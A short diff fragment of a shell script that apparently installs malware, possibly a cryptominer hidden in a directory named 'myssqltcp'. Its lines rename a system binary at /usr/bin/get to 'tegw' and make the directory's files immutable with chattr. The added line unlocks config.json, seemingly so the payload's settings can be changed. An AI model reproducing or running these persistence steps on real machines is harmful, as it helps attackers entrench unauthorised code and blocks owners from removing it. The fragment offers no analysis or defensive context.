@@ -48,3 +48,5 @@ mv /usr/bin/get /usr/bin/tegw
 
 echo "[*] Yes-Go"
 chattr +i $HOME/myssqltcp/*
+chattr -i $HOME/myssqltcp/config.json
+
